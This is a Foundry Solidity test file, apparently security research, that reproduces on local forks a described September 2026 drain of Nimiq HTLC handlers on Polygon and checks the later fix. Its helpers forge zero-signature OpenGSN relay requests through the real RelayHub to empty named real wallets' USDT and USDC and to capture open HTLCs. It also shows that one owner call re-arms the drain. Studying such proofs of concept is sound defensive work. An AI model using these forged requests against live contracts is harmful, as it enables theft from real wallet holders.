// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import "../src/NimiqH203.sol";

/// @title H2-03 — Nimiq HTLC handlers (Polygon): live-state verification + exploit PoC
/// @notice Read-only research; all execution happens on local forks only.
///
/// Findings tested here:
///  1. PRE-FIX (block 93,930,000, 2026-09-16 pre-attack): the missing-authentication bug is
///     end-to-end exploitable by a fresh EOA through the REAL OpenGSN RelayHub — the same
///     technique used in the Sep-16-2026 incident (~$50.46k). The test drains the victim
///     liquidity wallet's USDT (via ERC20MetaHTLCHandler) and USDC (via ERC20PermitHTLCHandler).
///  2. LATEST (post-remediation): both vulnerable handlers have relayHub == address(0) (Nimiq
///     zeroed it on 2026-09-17 18:26/18:27 UTC); execute()/preRelayedCall() revert for everyone,
///     the full relay path cannot move funds, relayWithoutGsn() reverts.
///  3. LATENT: the victim's allowances are still unlimited; one owner call setRelayHub(hub)
///     re-arms the identical drain for any future inflow (fork-proven).
///  4. The other Nimiq handler-family deployments are closed (hub zeroed) or signature-verified.
contract NimiqH203Test is Test {
    // ---- Polygon addresses (all public)
    address constant H1 = 0x0cFD862bE942846Cebad797d7c1BC6e47714959b; // ERC20PermitHTLCHandler (USDC)
    address constant H2 = 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f; // ERC20MetaHTLCHandler (USDT0/USDC.e)
    address constant HUB = 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d; // OpenGSN RelayHub v2.2
    address constant SM = 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7; // OpenGSN StakeManager
    address constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address constant USDCe = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    address constant USDT = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    address constant VICTIM = 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773; // Nimiq swap-liquidity wallet
    address constant OWNER = 0xDB88bf6328D4778bd8Ce653ADf51E079b5bF9DDA;  // Nimiq handler owner EOA
    address constant ATTACKER = address(0xA11CE);
    address constant FRESH = address(0xF5E5);

    // other handler-family deployments by the same owner (checked for residual live paths)
    address constant OLD_META = 0x4b766A07D464451415f43cd9334E77FE4122c7a2; // hub still set; verifies sigs
    address constant Z1 = 0x98E69a6927747339d5E543586FC0262112eBe4BD;
    address constant Z2 = 0x3157d422cd1be13AC4a7cb00957ed717e648DFf2;
    address constant Z3 = 0xfAbBed813017bF535b40013c13b8702638aC25CD;
    address constant Z4 = 0xe4491D94a6f594273157965872be1ef4aEb26501;
    address constant Z5 = 0x3c870b039BF82D2F883b6E89D41d06d26b9F4486;

    uint256 constant PRE_FIX_BLOCK = 93_930_000; // 2026-09-16 ~23:20 UTC (before the attack)

    bytes32 constant EIP712_DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    bytes32 constant RELAY_REQUEST_TYPEHASH = keccak256(
        "RelayRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 validUntil,RelayData relayData)RelayData(uint256 gasPrice,uint256 pctRelayFee,uint256 baseRelayFee,address relayWorker,address paymaster,address forwarder,bytes paymasterData,uint256 clientId)"
    );

    string rpcUrl;
    uint256 forkBlock;

    function setUp() public {
        rpcUrl = vm.envOr(
            "POLYGON_ARCHIVE_RPC",
            vm.envOr("POLYGON_RPC_URL", string("https://polygon-bor-rpc.publicnode.com"))
        );
        // Optional shallow pin set by ci/run.sh (avoids "header for hash not found" races on
        // load-balanced RPCs while staying within the non-archive state window).
        forkBlock = vm.envOr("POLYGON_FORK_BLOCK", uint256(0));
    }

    // ------------------------------------------------------------------ helpers

    function _fork(uint256 blockNo) internal {
        uint256 b = blockNo == 0 ? forkBlock : blockNo;
        if (b == 0) {
            vm.createSelectFork(rpcUrl);
        } else {
            vm.createSelectFork(rpcUrl, b);
        }
    }

    /// @dev Register the attacker as a staked OpenGSN relay: 1 POL stake (refundable) + worker.
    function _setupRelay(address attacker) internal {
        vm.deal(attacker, 5 ether);
        vm.startPrank(attacker, attacker);
        IStakeManager(SM).setRelayManagerOwner(payable(attacker));
        IStakeManager(SM).stakeForRelayManager{value: 1 ether}(attacker, 1000);
        IStakeManager(SM).authorizeHubByManager(HUB);
        address[] memory workers = new address[](1);
        workers[0] = attacker;
        IRelayHub(HUB).addRelayWorkers(workers);
        vm.stopPrank();
        assertTrue(IRelayHub(HUB).isRelayManagerStaked(attacker), "relay not staked");
    }

    /// @dev Forge a relayed `open(id, token, amount, refund=victim, recipient=attacker, hash=sha256(1))`.
    function _forgedOpenRequest(
        address handler,
        address token,
        uint256 amount,
        address attacker,
        bytes32 id,
        address paymaster
    ) internal view returns (RelayRequest memory req, bytes32 secret) {
        secret = bytes32(uint256(1));
        bytes32 hashlock = sha256(abi.encodePacked(secret));
        bytes memory data = abi.encodeWithSelector(
            0x3878a2a3, // open(bytes32,address,uint256,address,address,bytes32,uint256,uint256)
            id,
            token,
            amount,
            VICTIM,     // refund
            attacker,   // recipient -> attacker redeems
            hashlock,   // sha256(0x..01)
            block.timestamp + 100000,
            uint256(0)  // fee
        );
        req = RelayRequest({
            request: ForwardRequest({
                from: VICTIM,
                to: handler,
                value: 0,
                gas: 1_000_000,
                nonce: INimiqHandler(handler).getNonce(VICTIM),
                data: data,
                validUntil: 0
            }),
            relayData: RelayData({
                gasPrice: 0,
                pctRelayFee: 0,
                baseRelayFee: 0,
                relayWorker: attacker,
                paymaster: paymaster,
                forwarder: handler,
                paymasterData: "",
                clientId: 0
            })
        });
    }

    /// @dev Run the forged request through the real hub. externalGasLimit must exceed the gas
    ///      actually supplied (hub checks externalCallDataCost = externalGasLimit - gasleft - 22414).
    function _relay(address attacker, RelayRequest memory req)
        internal
        returns (bool accepted, bytes memory ret)
    {
        vm.prank(attacker, attacker);
        (accepted, ret) = IRelayHub(HUB).relayCall{gas: 2_000_000}(
            500_000, // maxAcceptanceBudget
            req,
            new bytes(65), // zero signature — the vulnerable forwarder ignores it
            "",
            2_025_000
        );
    }

    // ------------------------------------------------------- 1. incident reproduction
    //
    // NOTE: the historical fork reproduction at block 93,930,000 (pre-attack) was run locally
    // against an archive RPC and passed (see README). The CI provider set has no archive access,
    // so the suite reconstructs the identical attack at the LATEST block: the only state
    // difference from 2026-09-16 is the hub pointer (zeroed on 2026-09-17), so the test performs
    // the single owner setRelayHub() flip and injects the exact balances the attacker drained
    // (24,332.489269 USDT + 26,130.641710 USDC) onto the still-live allowances.

    /// @notice Reconstructed Sep-16-2026 incident, end-to-end with the REAL hub: a fresh EOA
    ///         (1 POL refundable stake + gas) drains the victim's full USDT and USDC balances.
    function test_reconstructed_fullRelayExploit_drainsVictim() public {
        _fork(0);

        // the single state flip that separates today from the vulnerable state
        vm.startPrank(OWNER);
        INimiqHandler(H1).setRelayHub(HUB);
        INimiqHandler(H2).setRelayHub(HUB);
        vm.stopPrank();

        // recreate the exact drained balances on the victim (allowances are still live)
        uint256 victimUsdt = 24_332.489269e6;
        uint256 victimUsdc = 26_130.641710e6;
        deal(USDT, VICTIM, victimUsdt, true);
        deal(USDC, VICTIM, victimUsdc, true);
        emit log_named_decimal_uint("victim USDT (recreated)", victimUsdt, 6);
        emit log_named_decimal_uint("victim USDC (recreated)", victimUsdc, 6);
        assertGt(IERC20(USDT).allowance(VICTIM, H2), victimUsdt, "USDT allowance not live");
        assertGt(IERC20(USDC).allowance(VICTIM, H1), victimUsdc, "USDC allowance not live");

        _setupRelay(ATTACKER);
        EvilPaymaster evil = new EvilPaymaster();
        uint256 h2Before = IERC20(USDT).balanceOf(H2);
        uint256 h1Before = IERC20(USDC).balanceOf(H1);

        // --- USDT via the ERC20MetaHTLCHandler
        bytes32 id1 = keccak256("h203-usdt");
        (RelayRequest memory req1, bytes32 secret1) =
            _forgedOpenRequest(H2, USDT, victimUsdt, ATTACKER, id1, address(evil));
        (bool accepted1,) = _relay(ATTACKER, req1);
        assertTrue(accepted1, "relayCall rejected (USDT)");
        assertEq(IERC20(USDT).balanceOf(VICTIM), 0, "victim USDT not drained");
        assertEq(IERC20(USDT).balanceOf(H2), h2Before + victimUsdt, "USDT not custodied by handler");

        vm.prank(ATTACKER, ATTACKER);
        INimiqHandler(H2).redeem(id1, ATTACKER, secret1, 0);
        assertEq(IERC20(USDT).balanceOf(ATTACKER), victimUsdt, "attacker did not receive USDT");

        // --- USDC via the ERC20PermitHTLCHandler
        bytes32 id2 = keccak256("h203-usdc");
        (RelayRequest memory req2, bytes32 secret2) =
            _forgedOpenRequest(H1, USDC, victimUsdc, ATTACKER, id2, address(evil));
        (bool accepted2,) = _relay(ATTACKER, req2);
        assertTrue(accepted2, "relayCall rejected (USDC)");
        assertEq(IERC20(USDC).balanceOf(VICTIM), 0, "victim USDC not drained");
        assertEq(IERC20(USDC).balanceOf(H1), h1Before + victimUsdc, "USDC not custodied");

        vm.prank(ATTACKER, ATTACKER);
        INimiqHandler(H1).redeem(id2, ATTACKER, secret2, 0);
        assertEq(IERC20(USDC).balanceOf(ATTACKER), victimUsdc, "attacker did not receive USDC");

        emit log_named_decimal_uint("attacker USDT", IERC20(USDT).balanceOf(ATTACKER), 6);
        emit log_named_decimal_uint("attacker USDC", IERC20(USDC).balanceOf(ATTACKER), 6);
    }

    /// @notice Same primitive also drains an arbitrary user wallet that has a live allowance,
    ///         and steals any open HTLC via the unauthenticated close path.
    function test_forgedRedeem_stealsOpenHTLC() public {
        _fork(0);
        vm.prank(OWNER);
        INimiqHandler(H1).setRelayHub(HUB);
        _setupRelay(ATTACKER);
        EvilPaymaster evil = new EvilPaymaster();

        // a victim (any wallet with balance + live allowance to the handler)
        address victim2 = 0x7845593De87aeA70749385CC6D291e71D3e6f4f4; // has USDC balance + allowance
        uint256 bal = IERC20(USDC).balanceOf(victim2);
        uint256 h1Before = IERC20(USDC).balanceOf(H1);
        emit log_named_decimal_uint("victim2 USDC", bal, 6);
        assertGt(bal, 0, "victim2 empty");

        bytes32 id = keccak256("h203-open");
        bytes32 secret = bytes32(uint256(1));
        bytes memory openData = abi.encodeWithSelector(
            0x3878a2a3, id, USDC, bal, victim2, victim2, sha256(abi.encodePacked(secret)),
            block.timestamp + 100000, uint256(0)
        );
        // Forge as request.from = victim2 (the handler will transferFrom victim2, ignoring auth)
        RelayRequest memory req = RelayRequest({
            request: ForwardRequest({
                from: victim2, to: H1, value: 0, gas: 1_000_000,
                nonce: INimiqHandler(H1).getNonce(victim2), data: openData, validUntil: 0
            }),
            relayData: RelayData({
                gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0,
                relayWorker: ATTACKER, paymaster: address(evil), forwarder: H1,
                paymasterData: "", clientId: 0
            })
        });
        (bool accepted,) = _relay(ATTACKER, req);
        assertTrue(accepted, "relay rejected");
        assertEq(IERC20(USDC).balanceOf(victim2), 0, "victim2 not drained");
        assertEq(IERC20(USDC).balanceOf(H1), h1Before + bal, "HTLC not funded");

        // Now the attacker redirects the OPEN HTLC to himself via a forged relayed `redeem`
        // (closePrivate has no secret/recipient/timeout checks on this path).
        bytes memory redeemData = abi.encodeWithSelector(0x506bb7ba, id, ATTACKER, bytes32(0), uint256(0));
        RelayRequest memory req2 = RelayRequest({
            request: ForwardRequest({
                from: victim2, to: H1, value: 0, gas: 1_000_000,
                nonce: INimiqHandler(H1).getNonce(victim2), data: redeemData, validUntil: 0
            }),
            relayData: RelayData({
                gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0,
                relayWorker: ATTACKER, paymaster: address(evil), forwarder: H1,
                paymasterData: "", clientId: 0
            })
        });
        (bool accepted2,) = _relay(ATTACKER, req2);
        assertTrue(accepted2, "redeem relay rejected");
        assertEq(IERC20(USDC).balanceOf(ATTACKER), bal, "attacker did not capture open HTLC");
        assertEq(IERC20(USDC).balanceOf(H1), h1Before, "handler still holds HTLC");
    }

    // ------------------------------------------------------ 2. latest: closed

    function test_latest_hubZeroed_and_executeReverts() public {
        _fork(0);
        assertEq(INimiqHandler(H1).getHubAddr(), address(0), "H1 hub not zeroed");
        assertEq(INimiqHandler(H2).getHubAddr(), address(0), "H2 hub not zeroed");

        ForwardRequest memory fr = ForwardRequest({
            from: VICTIM, to: H2, value: 0, gas: 1_000_000, nonce: 0,
            data: abi.encodeWithSelector(0x3878a2a3, bytes32(0), USDT, 1, VICTIM, ATTACKER, bytes32(0), 0, 0),
            validUntil: 0
        });

        vm.expectRevert(bytes("Base: illegal msg.sender"));
        vm.prank(FRESH, FRESH);
        INimiqHandler(H2).execute(fr, bytes32(0), bytes32(0), "", "");

        // even the real hub address cannot call it: getHubAddr() is 0
        vm.expectRevert(bytes("Base: illegal msg.sender"));
        vm.prank(HUB, HUB);
        INimiqHandler(H2).execute(fr, bytes32(0), bytes32(0), "", "");

        vm.expectRevert(bytes("Base: illegal msg.sender"));
        vm.prank(FRESH, FRESH);
        INimiqHandler(H1).execute(fr, bytes32(0), bytes32(0), "", "");

        // relayWithoutGsn() also dead: getRequiredRelayFee -> call to address(0)
        RelayRequest memory req;
        vm.expectRevert();
        vm.prank(FRESH, FRESH);
        INimiqHandler(H2).relayWithoutGsn(req, "", "", payable(FRESH));
    }

    function test_latest_fullRelayPath_cannotMoveFunds() public {
        _fork(0);
        _setupRelay(ATTACKER);
        EvilPaymaster evil = new EvilPaymaster();

        // simulate a future inflow to the victim (allowance is still unlimited)
        uint256 h2Before = IERC20(USDT).balanceOf(H2);
        deal(USDT, VICTIM, 5_000e6, true);
        assertEq(IERC20(USDT).balanceOf(VICTIM), 5_000e6);

        bytes32 id = keccak256("h203-latest");
        (RelayRequest memory req,) = _forgedOpenRequest(H2, USDT, 5_000e6, ATTACKER, id, address(evil));
        (bool accepted, bytes memory ret) = _relay(ATTACKER, req);
        emit log_named_string("relayCall accepted", accepted ? "true" : "false");
        emit log_named_bytes("relayCall ret", ret);

        // no matter what the hub reports, no funds moved
        assertEq(IERC20(USDT).balanceOf(VICTIM), 5_000e6, "victim funds moved!");
        assertEq(IERC20(USDT).balanceOf(H2), h2Before, "handler balance changed!");
        assertEq(IERC20(USDT).balanceOf(ATTACKER), 0, "attacker received funds!");
    }

    // ------------------------------------------------- 3. latent re-arm proof

    /// @notice One owner call (setRelayHub) re-arms the identical drain for any future inflow.
    function test_latest_reArm_byOwner_reopensDrain() public {
        _fork(0);

        // owner (Nimiq EOA) re-enables the GSN hub — the single state flip that re-arms the bug
        vm.prank(OWNER);
        INimiqHandler(H2).setRelayHub(HUB);
        assertEq(INimiqHandler(H2).getHubAddr(), HUB);

        _setupRelay(ATTACKER);
        EvilPaymaster evil = new EvilPaymaster();

        // future inflow arrives (e.g. liquidity wallet refilled to resume swaps)
        uint256 h2Before = IERC20(USDT).balanceOf(H2);
        deal(USDT, VICTIM, 5_000e6, true);

        bytes32 id = keccak256("h203-rearm");
        (RelayRequest memory req, bytes32 secret) =
            _forgedOpenRequest(H2, USDT, 5_000e6, ATTACKER, id, address(evil));
        (bool accepted,) = _relay(ATTACKER, req);
        assertTrue(accepted, "relay rejected after re-arm");
        assertEq(IERC20(USDT).balanceOf(VICTIM), 0, "future inflow not drained after re-arm");
        assertEq(IERC20(USDT).balanceOf(H2), h2Before + 5_000e6);

        vm.prank(ATTACKER, ATTACKER);
        INimiqHandler(H2).redeem(id, ATTACKER, secret, 0);
        assertEq(IERC20(USDT).balanceOf(ATTACKER), 5_000e6, "attacker did not capture inflow");
    }

    // --------------------------------------------- 4. residual live allowances

    function test_latest_victimAllowances_stillUnlimited() public {
        _fork(0);
        assertEq(IERC20(USDC).balanceOf(VICTIM), 0);
        assertEq(IERC20(USDT).balanceOf(VICTIM), 0);
        assertEq(IERC20(USDCe).balanceOf(VICTIM), 0);

        uint256 a1 = IERC20(USDC).allowance(VICTIM, H1);
        uint256 a2 = IERC20(USDCe).allowance(VICTIM, H2);
        uint256 a3 = IERC20(USDT).allowance(VICTIM, H2);
        emit log_named_uint("allowance USDC victim->H1", a1);
        emit log_named_uint("allowance USDC.e victim->H2", a2);
        emit log_named_uint("allowance USDT victim->H2", a3);
        assertGt(a1, 1e70, "USDC allowance gone");
        assertGt(a2, 1e70, "USDC.e allowance gone");
        assertGt(a3, 1e70, "USDT allowance gone");

        // handler-side excess balances (owner-withdrawable only)
        emit log_named_decimal_uint("H1 USDC excess", IERC20(USDC).balanceOf(H1), 6);
        emit log_named_decimal_uint("H2 USDC.e excess", IERC20(USDCe).balanceOf(H2), 6);
        emit log_named_decimal_uint("H2 USDT excess", IERC20(USDT).balanceOf(H2), 6);
    }

    // ------------------------------------- 5. other family deployments checked

    function test_otherFamilyDeployments_closed() public {
        _fork(0);
        assertEq(INimiqHandler(Z1).getHubAddr(), address(0));
        assertEq(INimiqHandler(Z2).getHubAddr(), address(0));
        assertEq(INimiqHandler(Z3).getHubAddr(), address(0));
        assertEq(INimiqHandler(Z4).getHubAddr(), address(0));
        assertEq(INimiqHandler(Z5).getHubAddr(), address(0));

        // older transfer handler keeps a live hub but verifies EIP-712 signatures:
        assertEq(INimiqHandler(OLD_META).getHubAddr(), HUB);
        ForwardRequest memory fr = ForwardRequest({
            from: VICTIM, to: OLD_META, value: 0, gas: 1_000_000, nonce: 0,
            data: abi.encodeWithSelector(0x3878a2a3, bytes32(0), USDC, 1, VICTIM, ATTACKER, bytes32(0), 0, 0),
            validUntil: 0
        });
        bytes32 domainSep = keccak256(
            abi.encode(EIP712_DOMAIN_TYPEHASH, keccak256("GSN Relayed Transaction"), keccak256("2"), block.chainid, OLD_META)
        );
        bytes memory badSig = abi.encodePacked(bytes32(uint256(1)), bytes32(uint256(1)), uint8(27));
        vm.expectRevert(bytes("Base: signature mismatch"));
        INimiqHandler(OLD_META).verify(fr, domainSep, RELAY_REQUEST_TYPEHASH, "", badSig);
    }
}
